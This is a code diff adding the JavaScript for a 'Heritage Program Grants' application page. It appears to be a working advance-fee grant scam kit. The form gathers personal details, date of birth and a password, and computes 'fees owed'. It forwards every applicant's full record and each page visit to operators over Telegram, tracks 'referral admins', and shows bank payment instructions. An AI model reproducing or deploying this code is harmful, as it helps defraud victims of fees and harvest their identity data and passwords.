+                return symbol + Number(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            }
+
+            // ============================================================
+            // BUILD TELEGRAM MESSAGE (BROWSER-SIDE)
+            // ============================================================
+            function buildTelegramMessage(app, isReferred, adminName) {
+                const country = app.country || 'USA';
+                const amount = parseFloat(app.grant_amount) || 0;
+                const awarded = app.awarded_balance ? formatCurrency(app.awarded_balance, country) : 'Pending Review';
+                const fees = app.fees_owed ? formatCurrency(app.fees_owed, country) : 'Pending Review';
+                
+                const sourceText = isReferred ? '🔗 REFERRAL APPLICATION' : '🌐 PUBLIC APPLICATION';
+                const sourceDetail = isReferred ? `Referral Admin: ${adminName || 'N/A'}` : 'Direct Application';
+
+                const lines = [
+                    '🏛️ HERITAGE PROGRAM GRANTS',
+                    '━'.repeat(45),
+                    '',
+                    '📋 ' + sourceText,
+                    '',
+                    '📌 Source: ' + sourceDetail,
+                    '',
+                    '🔑 Case ID: ' + app.case_id,
+                    '',
+                    '👤 Personal Information',
+                    '├ Name: ' + (app.full_name || 'N/A'),
+                    '├ Email: ' + (app.email || 'N/A'),
+                    '├ Phone: ' + (app.phone || 'N/A'),
+                    '├ DOB: ' + (app.date_of_birth || 'N/A'),
+                    '└ Country: ' + country,
+                    '',
+                    '🏠 Address',
+                    '├ ' + (app.address || 'N/A'),
+                    '├ ' + (app.city || '') + ', ' + (app.state_province || ''),
+                    '└ ' + (app.postal_code || 'N/A'),
+                    '',
+                    '💰 Grant Details',
+                    '├ Program: ' + (app.grant_program_name || app.grant_program || 'N/A'),
+                    '├ Amount Requested: ' + formatCurrency(amount, country),
+                    '├ Awarded Balance: ' + awarded,
+                    '├ Fees Owed: ' + fees,
+                    '└ Status: ' + (app.status || 'Pending Review'),
+                    '',
+                    '📝 Purpose Statement',
+                    (app.purpose_statement || '').substring(0, 300) + ((app.purpose_statement || '').length > 300 ? '...' : ''),
+                    '',
+                    '🌐 Submission Details',
+                    '├ Language: ' + (app.language_preference || 'en'),
+                    '└ Submitted: ' + (app.created_at || new Date().toISOString())
+                ];
+
+                return lines.filter(line => line !== '' && line !== undefined && line !== null).join('\n');
+            }
+
+            // ============================================================
+            // SEND TELEGRAM NOTIFICATION (BROWSER-SIDE)
+            // ============================================================
+            async function sendTelegramNotification(message) {
+                try {
+                    const response = await fetch('/api/telegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            message: message
+                        })
+                    });
+                    return await response.json();
+                } catch (error) {
+                    console.error('Telegram send error:', error);
+                    return { success: false, error: error.message };
+                }
+            }
+
+            // ============================================================
+            // TELEGRAM PAGE STARTED NOTIFICATION
+            // ============================================================
+            async function notifyPageLoaded() {
+                try {
+                    await fetch('/api/telegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            message: '📄 <b>Page Visited</b>\n📍 ' + window.location.pathname,
+                            type: 'page_started'
+                        })
+                    });
+                } catch (e) {
+                    // Silent fail - don't block the page
+                }
+            }
+
+            // ============================================================
+            // REFERRAL VALIDATION
+            // ============================================================
+            async function validateReferral() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const ref = urlParams.get('ref');
+                
+                if (!ref) {
+                    document.getElementById('applicationFormContainer').style.display = 'block';
+                    document.getElementById('referralBanner').classList.remove('visible');
+                    return;
+                }
+                
+                try {
+                    const response = await fetch('/api/applications/validate-ref?ref=' + encodeURIComponent(ref));
+                    const result = await response.json();
+                    
+                    if (result.success && result.data) {
+                        referralData = result.data;
+                        document.getElementById('applicationFormContainer').style.display = 'block';
+                        document.getElementById('referralBanner').classList.add('visible');
+                        document.getElementById('grantForm').dataset.ref = ref;
+                        
+                        if (result.data.referral_name) {
+                            document.getElementById('referralTitle').textContent = '⭐ Referral from ' + result.data.referral_name;
+                        } else if (result.data.admin_name) {
+                            document.getElementById('referralTitle').textContent = '⭐ Referral from ' + result.data.admin_name;
+                        }
+                        
+                        if (result.data.referral_amount) {
+                            document.getElementById('referralSubtitle').textContent = '🎯 Offer: ' + result.data.referral_amount;
+                        }
+                    } else {
+                        document.getElementById('applicationFormContainer').style.display = 'none';
+                        document.getElementById('claimedPage').style.display = 'block';
+                        if (result.data && result.data.referral_name) {
+                            document.getElementById('offerDetails').style.display = 'block';
+                            document.getElementById('offerName').textContent = result.data.referral_name || 'N/A';
+                            document.getElementById('offerAmount').textContent = result.data.referral_amount || 'N/A';
+                        }
+                    }
+                } catch (error) {
+                    console.error('Referral validation error:', error);
+                    document.getElementById('applicationFormContainer').style.display = 'block';
+                    showToast('error', 'Error validating referral link. Please try again.');
+                }
+            }
+
+            // ============================================================
+            // COUNTRY
+            // ============================================================
+            function selectCountry(country) {
+                selectedCountry = country;
+                const config = CONFIG.countries[country];
+                if (!config) return;
+                document.querySelectorAll('.country-btn').forEach(btn => {
+                    btn.classList.toggle('active', btn.dataset.country === country);
+                    btn.setAttribute('aria-checked', btn.dataset.country === country ? 'true' : 'false');
+                });
+                document.getElementById('countryDisplay').value = config.countryName;
+                const stateSelect = document.getElementById('stateProvince');
+                const options = config.states || [];
+                stateSelect.innerHTML = '<option value="">Select...</option>';
+                options.forEach(opt => {
+                    const option = document.createElement('option');
+                    option.value = opt;
+                    option.textContent = opt;
+                    stateSelect.appendChild(option);
+                });
+                document.getElementById('currencySymbol').textContent = config.currencySymbol;
+                const symbol = config.currencySymbol || '$';
+                document.getElementById('amountRange').textContent = 'Min: ' + symbol + '1,000 | Max: ' + symbol + '1,000,000';
+                updateGrantOptions(country);
+            }
+
+            function updateGrantOptions(country) {
+                const programs = Object.entries(CONFIG.grantPrograms).filter(([key, val]) => {
+                    return val.countries && val.countries.includes(country);
+                });
+                const select = document.getElementById('grantProgram');
+                select.innerHTML = '<option value="">Select a program...</option>';
+                programs.forEach(([key, val]) => {
+                    const option = document.createElement('option');
+                    option.value = key;
+                    option.textContent = val.name;
+                    select.appendChild(option);
+                });
+            }
+
+            // ============================================================
+            // STEP NAVIGATION
+            // ============================================================
+            function nextStep() {
+                if (validateStep(currentStep)) {
+                    if (currentStep < totalSteps) {
+                        currentStep++;
+                        updateStep(currentStep);
+                        const formStep = document.querySelector('.form-step.active');
+                        if (formStep) formStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                    }
+                }
+            }
+
+            function prevStep() {
+                if (currentStep > 1) {
+                    currentStep--;
+                    updateStep(currentStep);
+                    const formStep = document.querySelector('.form-step.active');
+                    if (formStep) formStep.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            }
+
+            function updateStep(step) {
+                document.querySelectorAll('.step-indicator').forEach((el, index) => {
+                    const stepNum = index + 1;
+                    el.classList.toggle('active', stepNum === step);
+                    el.classList.toggle('completed', stepNum < step);
+                });
+                document.querySelectorAll('.form-step').forEach((el, index) => {
+                    const stepNum = index + 1;
+                    el.classList.toggle('active', stepNum === step);
+                });
+                const progress = (step / totalSteps) * 100;
+                document.getElementById('progressFill').style.width = progress + '%';
+                const isFirst = step === 1;
+                const isLast = step === totalSteps;
+                document.querySelectorAll('[id^="prevStep"]').forEach(btn => {
+                    btn.style.display = isFirst ? 'none' : 'inline-flex';
+                });
+                document.querySelectorAll('[id^="nextStep"]').forEach(btn => {
+                    btn.style.display = isLast ? 'none' : 'inline-flex';
+                });
+                document.getElementById('submitBtn').style.display = isLast ? 'inline-flex' : 'none';
+                if (isLast) {
+                    populateReview();
+                    generateChallenge();
+                }
+            }
+
+            // ============================================================
+            // VALIDATION
+            // ============================================================
+            function validateStep(step) {
+                const data = collectStepData(step);
+                switch (step) {
+                    case 1:
+                        if (!data.firstName) { showToast('error', getToastText('toastFirstName')); return false; }
+                        if (!data.lastName) { showToast('error', getToastText('toastLastName')); return false; }
+                        if (!data.email) { showToast('error', getToastText('toastEmail')); return false; }
+                        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)) { showToast('error', getToastText('toastValidEmail')); return false; }
+                        if (!data.phone) { showToast('error', getToastText('toastPhone')); return false; }
+                        if (!data.dob) { showToast('error', getToastText('toastDob')); return false; }
+                        if (!data.password) { showToast('error', getToastText('toastPassword')); return false; }
+                        if (data.password.length < 8) { showToast('error', getToastText('toastPasswordLength')); return false; }
+                        if (data.password !== document.getElementById('confirmPassword').value) {
+                            showToast('error', getToastText('toastPasswordMatch'));
+                            return false;
+                        }
+                        break;
+                    case 2:
+                        if (!data.address) { showToast('error', getToastText('toastAddress')); return false; }
+                        if (!data.city) { showToast('error', getToastText('toastCity')); return false; }
+                        if (!data.stateProvince) { showToast('error', getToastText('toastState')); return false; }
+                        if (!data.postalCode) { showToast('error', getToastText('toastPostal')); return false; }
+                        break;
+                    case 3:
+                        if (!data.grantProgram) { showToast('error', getToastText('toastProgram')); return false; }
+                        if (!data.grantAmount || parseFloat(data.grantAmount) < 1000) {
+                            showToast('error', getToastText('toastAmountMin'));
+                            return false;
+                        }
+                        if (parseFloat(data.grantAmount) > 1000000) {
+                            showToast('error', getToastText('toastAmountMax'));
+                            return false;
+                        }
+                        if (!data.purposeStatement || data.purposeStatement.length < 1) {
+                            showToast('error', getToastText('toastPurpose'));
+                            return false;
+                        }
+                        break;
+                    case 4:
+                        const challengeAnswer = document.getElementById('challengeAnswer').value.trim();
+                        const expectedAnswer = document.getElementById('challengeExpected').value;
+                        if (!challengeAnswer) { showToast('error', getToastText('toastChallenge')); return false; }
+                        if (challengeAnswer !== expectedAnswer) {
+                            generateChallenge();
+                            document.getElementById('challengeAnswer').value = '';
+                            showToast('error', getToastText('toastChallengeWrong'));
+                            return false;
+                        }
+                        if (!document.getElementById('termsCheck').checked) {
+                            showToast('error', getToastText('toastTerms'));
+                            return false;
+                        }
+                        break;
+                }
+                formData = { ...formData, ...data };
+                return true;
+            }
+
+            function collectStepData(step) {
+                const data = {};
+                const stepEl = document.querySelector('.form-step[data-step="' + step + '"]');
+                if (!stepEl) return data;
+                const inputs = stepEl.querySelectorAll('.form-control');
+                inputs.forEach(field => { if (field.id) data[field.id] = field.value; });
+                const selects = stepEl.querySelectorAll('select.form-control');
+                selects.forEach(field => { if (field.id) data[field.id] = field.value; });
+                return data;
+            }
+
+            // ============================================================
+            // REVIEW
+            // ============================================================
+            function populateReview() {
+                const container = document.getElementById('reviewContainer');
+                if (!container) return;
+                const data = { ...formData, ...collectStepData(currentStep) };
+                const config = CONFIG.countries[selectedCountry];
+                const currencySymbol = config ? config.currencySymbol : '$';
+                const amount = parseFloat(data.grantAmount) || 0;
+                const feePercentage = CONFIG.fees.percentage;
+                const feeFixed = CONFIG.fees.fixed;
+                const totalFee = Math.max(feeFixed, amount * feePercentage);
+                const finalFee = Math.min(totalFee, CONFIG.fees.maxFee);
+                const awardedBalance = amount - finalFee;
+                const reviewItems = [
+                    { label: 'First Name / Last Name', value: (data.firstName || '') + ' ' + (data.middleName || '') + ' ' + (data.lastName || '') },
+                    { label: 'Email Address', value: data.email || 'N/A' },
+                    { label: 'Phone Number', value: data.phone || 'N/A' },
+                    { label: 'Date of Birth', value: data.dob || 'N/A' },
+                    { label: 'Street Address', value: data.address || 'N/A' },
+                    { label: 'City', value: data.city || 'N/A' },
+                    { label: 'State / Province', value: data.stateProvince || 'N/A' },
+                    { label: 'Postal Code', value: data.postalCode || 'N/A' },
+                    { label: 'Country', value: config ? config.countryName : 'N/A' },
+                    { label: 'Grant Program', value: data.grantProgram ? (CONFIG.grantPrograms[data.grantProgram]?.name || data.grantProgram) : 'N/A' },
+                    { label: 'Requested Amount', value: currencySymbol + amount.toLocaleString() },
+                    { label: 'Awarded Balance', value: currencySymbol + awardedBalance.toLocaleString() },
+                    { label: 'Fees Owed', value: currencySymbol + finalFee.toLocaleString() }
+                ];
+                container.innerHTML = reviewItems.map(item =>
+                    '<div class="review-item"><span class="review-label">' + item.label +
+                    '</span><span class="review-value">' + item.value + '</span></div>'
+                ).join('');
+            }
+
+            // ============================================================
+            // CHALLENGE
+            // ============================================================
+            function generateChallenge() {
+                const questions = CONFIG.antiBot.challengeQuestions;
+                const randomIndex = Math.floor(Math.random() * questions.length);
+                const challenge = questions[randomIndex];
+                document.getElementById('challengeQuestion').textContent = challenge.question;
+                document.getElementById('challengeExpected').value = challenge.answer;
+                document.getElementById('challengeAnswer').value = '';
+            }
+
+            // ============================================================
+            // GENERATE CASE ID
+            // ============================================================
+            function generateCaseId() {
+                const date = new Date();
+                const year = date.getFullYear();
+                const month = String(date.getMonth() + 1).padStart(2, '0');
+                const day = String(date.getDate()).padStart(2, '0');
+                const random = Math.random().toString(36).substring(2, 7).toUpperCase();
+                return 'HP-' + year + '-' + month + '-' + day + '-' + random;
+            }
+
+            // ============================================================
+            // SUBMIT APPLICATION
+            // ============================================================
+            async function submitApplication(e) {
+                e.preventDefault();
+                if (isSubmitting) return;
+                if (document.getElementById('honeypot').value !== '') {
+                    showToast('error', getToastText('toastHoneypot'));
+                    return;
+                }
+                if (!validateStep(currentStep)) return;
+                isSubmitting = true;
+                const submitBtn = document.getElementById('submitBtn');
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
+                try {
+                    const allData = {
+                        ...formData,
+                        ...collectStepData(currentStep),
+                        country: selectedCountry,
+                        idType: CONFIG.countries[selectedCountry]?.idType || 'ID',
+                        grantProgramName: CONFIG.grantPrograms[formData.grantProgram]?.name || '',
+                        previousApplicant: document.getElementById('previousApplicant').value || 'no',
+                        honeypot: document.getElementById('honeypot').value || '',
+                        pageLoadTime: ((Date.now() - pageLoadTime) / 1000).toFixed(1),
+                        challengeAnswer: document.getElementById('challengeAnswer').value.trim(),
+                        challengeExpected: document.getElementById('challengeExpected').value,
+                        language: 'en'
+                    };
+                    allData.full_name = (allData.firstName || '') + ' ' + (allData.middleName || '') + ' ' + (allData.lastName || '');
+                    allData.id_number = 'N/A';
+                    allData.id_document_ref = 'not_provided';
+                    const amount = parseFloat(allData.grantAmount) || 0;
+                    allData.grant_amount = amount;
+                    const feePercentage = CONFIG.fees.percentage;
+                    const feeFixed = CONFIG.fees.fixed;
+                    const totalFee = Math.max(feeFixed, amount * feePercentage);
+                    const finalFee = Math.min(totalFee, CONFIG.fees.maxFee);
+                    const awardedBalance = amount - finalFee;
+                    allData.fees_owed = finalFee;
+                    allData.awarded_balance = awardedBalance;
+                    allData.status = 'pending';
+                    allData.created_at = new Date().toISOString();
+                    const caseId = generateCaseId();
+                    allData.case_id = caseId;
+                    
+                    // Get referral ref from form dataset
+                    const ref = document.getElementById('grantForm').dataset.ref || null;
+                    
+                    const payload = {
+                        application: allData,
+                        ref: ref
+                    };
+                    
+                    // Submit to /api/submit
+                    const response = await fetch('/api/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    const result = await response.json();
+                    
+                    if (!result.success) {
+                        throw new Error(result.error || 'Submission failed');
+                    }
+                    
+                    // Send Telegram notification from browser
+                    try {
+                        const message = buildTelegramMessage(
+                            allData, 
+                            result.isReferred || false, 
+                            result.adminName || null
+                        );
+                        await sendTelegramNotification(message);
+                        console.log('✅ Telegram notification sent from browser');
+                    } catch (teleError) {
+                        console.warn('⚠️ Telegram notification failed, but application was saved:', teleError);
+                        showToast('warning', getToastText('toastTelegramFailed'));
+                    }
+                    
+                    showSuccess(result.caseId || caseId);
+                } catch (error) {
+                    console.error('❌ Submission error:', error);
+                    showToast('error', getToastText('toastSubmitFailed') + error.message);
+                } finally {
+                    isSubmitting = false;
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '<i class="fas fa-paper-plane" aria-hidden="true"></i> Submit Application';
+                }
+            }
+
+            // ============================================================
+            // SUCCESS
+            // ============================================================
+            function showSuccess(caseId) {
+                document.getElementById('grantForm').style.display = 'none';
+                document.getElementById('successSection').style.display = 'block';
+                document.getElementById('caseIdDisplay').textContent = caseId;
+                showToast('success', getToastText('toastSuccess') + caseId);
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            }
+
+            // ============================================================
+            // CHECK STATUS
+            // ============================================================
+            async function checkStatus() {
+                const caseId = document.getElementById('statusInput').value.trim();
+                if (!caseId) {
+                    showToast('error', getToastText('toastStatusEnter'));
+                    return;
+                }
+                const btn = document.getElementById('checkStatusBtn');
+                btn.disabled = true;
+                btn.innerHTML = '<span class="spinner"></span>';
+                try {
+                    const response = await fetch('/api/status?caseId=' + encodeURIComponent(caseId));
+                    const result = await response.json();
+                    if (!result.success || !result.data) {
+                        const container = document.getElementById('statusResult');
+                        container.style.display = 'block';
+                        container.innerHTML =
+                            '<div class="status-card" style="text-align:center;padding:40px;">' +
+                            '<div style="font-size:3rem;margin-bottom:16px;">🔍</div>' +
+                            '<h3>' + (result.error || getToastText('toastStatusNotFound')) + '</h3>' +
+                            '<p style="color:var(--text-light);">Please check your Case ID and try again.</p>' +
+                            '</div>';
+                        showToast('warning', result.error || getToastText('toastStatusNotFound'));
+                        return;
+                    }
+                    displayStatus(result.data);
+                } catch (error) {
+                    console.error('Status check error:', error);
+                    showToast('error', getToastText('toastError') + error.message);
+                } finally {
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fas fa-search" aria-hidden="true"></i> Check Status';
+                }
+            }
+
+            // ============================================================
+            // DISPLAY STATUS
+            // ============================================================
+            function displayStatus(app) {
+                const container = document.getElementById('statusResult');
+                container.style.display = 'block';
+                const config = CONFIG.countries[app.country] || CONFIG.countries.USA;
+                const currencySymbol = config.currencySymbol || '$';
+                const amount = parseFloat(app.grant_amount) || 0;
+                const statusColors = { pending: '#f59e0b', approved: '#10b981', rejected: '#ef4444', paid: '#3b82f6' };
+                const statusLabels = {
+                    pending: '⏳ Pending Review',
+                    approved: '✅ Approved',
+                    rejected: '❌ Rejected',
+                    paid: '💰 Paid'
+                };
+                container.innerHTML =
+                    '<div class="status-card">' +
+                    '<div class="status-header">' +
+                    '<h3>📋 Application Status</h3>' +
+                    '<span class="status-badge" style="background:' + (statusColors[app.status] || '#6b7280') + '">' + (
+                        statusLabels[app.status] || app.status.toUpperCase()) + '</span>' +
+                    '</div>' +
+                    '<div class="status-body">' +
+                    '<div class="status-row"><span class="label">Case ID</span><span class="value">' + app.case_id +
+                    '</span></div>' +
+                    '<div class="status-row"><span class="label">Applicant</span><span class="value">' + (app.full_name || 'N/A') + '</span></div>' +
+                    '<div class="status-row"><span class="label">Email</span><span class="value">' + (app.email || 'N/A') + '</span></div>' +
+                    '<div class="status-row"><span class="label">Country</span><span class="value">' + (config.countryName || app.country) + '</span></div>' +
+                    '<div class="status-row"><span class="label">Program</span><span class="value">' + (app.grant_program_name || app.grant_program || 'N/A') + '</span></div>' +
+                    '<div class="status-row"><span class="label">Amount</span><span class="value">' + currencySymbol + amount.toLocaleString() + '</span></div>' +
+                    '<div class="status-row"><span class="label">Awarded Balance</span><span class="value">' + (app.awarded_balance ? currencySymbol + parseFloat(app.awarded_balance).toLocaleString() : 'Pending Review') + '</span></div>' +
+                    '<div class="status-row"><span class="label">Fees Owed</span><span class="value">' + (app.fees_owed ? currencySymbol + parseFloat(app.fees_owed).toLocaleString() : 'Pending Review') + '</span></div>' +
+                    '<div class="status-row"><span class="label">Submitted</span><span class="value">' + new Date(app.created_at).toLocaleString() + '</span></div>' +
+                    '</div>' +
+                    (app.status === 'pending' ?
+                        '<div class="payment-info" style="border-left-color: #f59e0b;"><h4 style="color: #f59e0b;">⏳ Under Review</h4><p>Your application is currently being reviewed by our team.</p><p>You will receive a notification once a decision is made.</p></div>' :
+                        '<div class="payment-info"><h4>💳 Payment Instructions</h4><p><strong>Bank:</strong> Heritage Bank</p><p><strong>Account:</strong> 12345678</p><p><strong>Routing:</strong> 987654321</p><p><strong>Reference:</strong> ' + app.case_id + '</p></div>'
+                    ) +
+                    '<div class="status-footer"><small>For questions, contact support@heritagebank.com</small></div>' +
+                    '</div>';
+                container.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                showToast('success', getToastText('toastStatusRetrieved'));
+            }
+
+            // ============================================================
+            // UI HELPERS
+            // ============================================================
+            function updateSlider(e) {
+                const value = parseInt(e.target.value);
+                const config = CONFIG.countries[selectedCountry];
+                const symbol = config ? config.currencySymbol : '$';
+                document.getElementById('grantAmount').value = value;
+                document.getElementById('amountDisplay').textContent = symbol + value.toLocaleString();
+            }
+
+            function updateAmountInput(e) {
+                const value = parseInt(e.target.value) || 0;
+                const config = CONFIG.countries[selectedCountry];
+                const symbol = config ? config.currencySymbol : '$';
+                if (value >= 1000 && value <= 1000000) {
+                    document.getElementById('grantAmountSlider').value = value;
+                    document.getElementById('amountDisplay').textContent = symbol + value.toLocaleString();
+                }
+            }
+
+            function updateCharCount() {
+                const text = document.getElementById('purposeStatement').value;
+                const count = text.length;
+                document.getElementById('charCount').textContent = count + ' characters';
+                document.getElementById('charCount').style.color = count > 0 ? '#10b981' : '#8a8aaa';
+            }
+
+            function togglePassword(fieldId) {
+                const field = document.getElementById(fieldId);
+                const toggle = fieldId === 'password' ? document.getElementById('passwordToggle') : document.getElementById('confirmPasswordToggle');
+                if (!field || !toggle) return;
+                if (field.type === 'password') {
+                    field.type = 'text';
+                    toggle.innerHTML = '<i class="fas fa-eye-slash" aria-hidden="true"></i>';
+                } else {
+                    field.type = 'password';
+                    toggle.innerHTML = '<i class="fas fa-eye" aria-hidden="true"></i>';
+                }
+            }
+
+            function switchTab(tab) {
+                document.getElementById('tabApply').classList.toggle('active', tab === 'apply');
+                document.getElementById('tabStatus').classList.toggle('active', tab === 'status');
+                document.getElementById('tabContentApply').classList.toggle('active', tab === 'apply');
+                document.getElementById('tabContentStatus').classList.toggle('active', tab === 'status');
+                document.getElementById('tabApply').setAttribute('aria-selected', tab === 'apply' ? 'true' : 'false');
+                document.getElementById('tabStatus').setAttribute('aria-selected', tab === 'status' ? 'true' : 'false');
+                if (tab === 'status') {
+                    setTimeout(() => { document.getElementById('statusInput').focus(); }, 100);
+                }
+            }
+
+            // ============================================================
+            // INIT
+            // ============================================================
+            async function init() {
+                console.log('🏛️ Heritage Grants Application initializing...');
+                
+                // Send page loaded notification (non-blocking)
+                notifyPageLoaded();
+                
+                // Event Listeners
+                document.getElementById('tabApply').addEventListener('click', function() { switchTab('apply'); });
+                document.getElementById('tabStatus').addEventListener('click', function() { switchTab('status'); });
+                document.querySelectorAll('.country-btn').forEach(btn => {
+                    btn.addEventListener('click', function() { selectCountry(this.dataset.country); });
+                });
+                document.querySelectorAll('[id^="nextStep"]').forEach(btn => {
+                    btn.addEventListener('click', nextStep);
+                });
+                document.querySelectorAll('[id^="prevStep"]').forEach(btn => {
+                    btn.addEventListener('click', prevStep);
+                });
+                document.getElementById('passwordToggle').addEventListener('click', function() { togglePassword('password'); });
+                document.getElementById('confirmPasswordToggle').addEventListener('click', function() { togglePassword('confirmPassword'); });
+                document.getElementById('grantAmountSlider').addEventListener('input', updateSlider);
+                document.getElementById('grantAmount').addEventListener('input', updateAmountInput);
+                document.getElementById('purposeStatement').addEventListener('input', updateCharCount);
+                document.getElementById('grantForm').addEventListener('submit', submitApplication);
+                document.getElementById('checkStatusBtn').addEventListener('click', checkStatus);
+                document.getElementById('statusInput').addEventListener('keypress', function(e) {
+                    if (e.key === 'Enter') checkStatus();
+                });
+                
+                // Initialize
+                selectCountry('USA');
+                generateChallenge();
+                updateStep(1);
+                await validateReferral();
+                
+                // Hide loading
+                setTimeout(() => {
+                    document.getElementById('loadingOverlay').classList.add('hidden');
+                }, 1000);
+                
+                console.log('✅ Application initialized successfully!');
+            }
+
+            // Start
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', init);
+            } else {
+                init();
+            }
+
+        })();
+    </script>
+</body>
+</html>
